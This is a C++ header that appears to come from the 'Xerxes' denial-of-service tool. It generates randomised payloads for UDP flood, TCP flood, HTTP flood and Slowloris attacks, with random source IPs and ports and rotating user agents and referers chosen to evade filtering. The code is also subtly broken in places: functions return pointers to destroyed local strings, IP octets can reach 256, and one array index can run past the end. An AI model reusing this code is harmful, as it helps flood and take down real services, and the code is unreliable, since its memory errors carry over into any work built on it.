#ifndef XERXES_RANDOMIZER_H
#define XERXES_RANDOMIZER_H

#include <string>
#include <random>
#include <chrono>
#include <algorithm>

#include "Configuration.hpp"

namespace Randomizer{

    static int randomInt(int min, int max){
        unsigned seed = static_cast<unsigned int>(std::chrono::steady_clock::now().time_since_epoch().count());
        std::default_random_engine engine(seed);
        std::uniform_int_distribution<int> distribution(min, max);
        return distribution(engine);
    }

    static const char *randomIP(){
        std::string src{std::to_string(randomInt(1, 256))};
        src += "."
               + std::to_string(randomInt(1, 256))
               + "."
               + std::to_string(randomInt(1, 256))
               + "."
               + std::to_string(randomInt(1, 256));
        return src.c_str();
    }

    static int randomPort(){
        return randomInt(0, 65535);
    }

    static const char *randomstr(){
        int string_length =  randomInt(0, 20) + 1;
        std::string string{};
        for(int i = 0; i < string_length; ++i){
            string += (static_cast<char>('0' + randomInt(0, 72)));
        }
        return string.c_str();
    }

    static const char *randomUserAgent(const config *conf){
        if(conf->useragents.size() > 1){
            return conf->useragents[randomInt(0, static_cast<int>(conf->useragents.size()))].c_str();
        }
        return conf->useragents[0].c_str();
    }

    static const char *randomPacket(const config *conf, bool keep_alive=false){
        std::string packet{};
        std::vector<std::string> encoding{"\'\'", "*", "identity", "gzip", "deflate"};
        std::vector<std::string> caching{"no-cache", "max-age=0"};
        std::vector<std::string> charset{"ISO-8859-1", "utf-8", "Windows-1251", "ISO-8859-2", "ISO-8859-15"};
        std::vector<std::string> contenttype{"multipart/form-data", "application/x-url-encoded"};
        std::vector<std::string> methods{"GET", "POST", "HEAD"};
        std::vector<std::string> referer{"https://www.google.com/", "https://www.yahoo.com/", "https://www.bing.com/",
                                         "https://twitter.com/", "https://www.facebook.com/", "https://www.msn.com/",
                                         "https://www.youtube.com/", "https://yandex.com/", "https://www.amazon.com/"};
        shuffle(std::begin(encoding), std::end(encoding), std::mt19937(std::random_device()()));
        shuffle(std::begin(caching), std::end(caching), std::mt19937(std::random_device()()));
        shuffle(std::begin(charset), std::end(charset), std::mt19937(std::random_device()()));
        shuffle(std::begin(contenttype), std::end(contenttype), std::mt19937(std::random_device()()));
        shuffle(std::begin(methods), std::end(methods), std::mt19937(std::random_device()()));
        shuffle(std::begin(referer), std::end(referer), std::mt19937(std::random_device()()));
        switch(conf->vector){
            case config::UDPFlood:
            case config::TCPFlood:
                return randomstr();
            case config::HTTP:{
                packet += methods[0] + " /";
                if(conf->RandomizeHeader){
                    packet += randomstr();
                }
                packet += " HTTP/1.0\r\nUser-Agent: ";
                if(conf->RandomizeUserAgent){
                    packet += randomUserAgent(conf);
                }else{
                    packet += conf->useragents[0];
                }
                packet += " \r\nCache-Control: " + caching[0]
                          + " \r\nAccept-Encoding: " + encoding[0]
                          + " \r\nAccept-Charset: " + charset[0] + ", " + charset[1]
                          + " \r\nReferer: " + referer[0]
                          + " \r\nAccept: */*\r\nConnection: Keep-Alive"
                          + " \r\nContent-Type: " + contenttype[0]
                          + " \r\nCookie: " + randomstr() + "=" + randomstr()
                          + " \r\nKeep-Alive: " + std::to_string(randomInt(1, 5000))
                          + " \r\nDNT: " + std::to_string(randomInt(0, 1))
                          + "\r\n\r\n";
                return packet.c_str();
            }
            case config::Slowloris:{
                if(keep_alive){
                    packet += "X-a: "
                              + std::to_string(randomInt(1, 5000))
                              + " \r\n";
                }else{
                    packet += methods[0] + " /";
                    if(conf->RandomizeHeader){
                        packet += randomstr();
                    }
                    packet += " HTTP/1.0\r\nUser-Agent: ";
                    if(conf->RandomizeUserAgent){
                        packet += randomUserAgent(conf);
                    }else{
                        packet += conf->useragents[0];
                    }
                    if(methods[0] == "POST"){
                        packet += " \r\nContent-Length: " + std::to_string(randomInt(100000000, 1000000000));
                    }
                    packet += " \r\nCache-Control: " + caching[0]
                              + " \r\nAccept-Encoding: " + encoding[0]
                              + " \r\nAccept-Charset: " + charset[0] + ", " + charset[1]
                              + " \r\nReferer: " + referer[0]
                              + " \r\nContent-Type: " + contenttype[0]
                              + " \r\nCookie: " + randomstr() + "=" + randomstr()
                              + " \r\nAccept: */*"
                              + " \r\nDNT: " + std::to_string(randomInt(0, 1))
                              + " \r\nX-a: " + std::to_string(randomInt(1, 5000))
                              + " \r\n";
                }
                return packet.c_str();
            }
            default:
                return "";
        }
    }
}

#endif //XERXES_RANDOMIZER_H
